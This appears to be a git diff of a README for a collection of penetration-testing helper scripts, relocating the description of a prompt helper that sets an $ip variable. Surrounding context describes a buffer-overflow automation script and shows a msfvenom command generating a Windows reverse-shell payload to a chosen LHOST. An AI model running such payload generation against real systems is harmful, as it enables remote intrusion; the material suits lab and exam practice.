@@ -73,10 +73,6 @@ echo 'Terminator config successfully changed.'
 ```
 
 
-__dollar_ip_prompt_command.sh__ - Has a PROMPT_COMMAND env variable that will track a directory named using an IP on the current path (pwd)
-                             and it will set the $ip env variable to that IP named directory. The code should be place on .bashrc or .zshrc. For zsh you have to add the line ```bash precmd() { eval "$PROMPT_COMMAND" }``` at the end of the .zshrc file
-
-
 __autobof.sh__ - A script of generating 'full hex shellcode characterset' -> 'hex shellcode with deducted badchars' -> 'msfpayload'. Autobof will automatically generate payloads and modify exploit.py payload variable. Note: You have to paste the final msfvenom into
 exploit.py
 __badcharset.py__ - A script for generating the full hex shellcode 
@@ -142,6 +138,8 @@ then
     echo "$(msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=4444 EXITFUNC=thread -b $bc -f c)"
 fi
 ```
+__dollar_ip_prompt_command.sh__ - Has a PROMPT_COMMAND env variable that will track a directory named using an IP on the current path (pwd)
+                             and it will set the $ip env variable to that IP named directory. The code should be place on .bashrc or .zshrc. For zsh you have to add the line ```bash precmd() { eval "$PROMPT_COMMAND" }``` at the end of the .zshrc file
 
 ```bash
 # Example - $ip env variable is automatically set using the code below
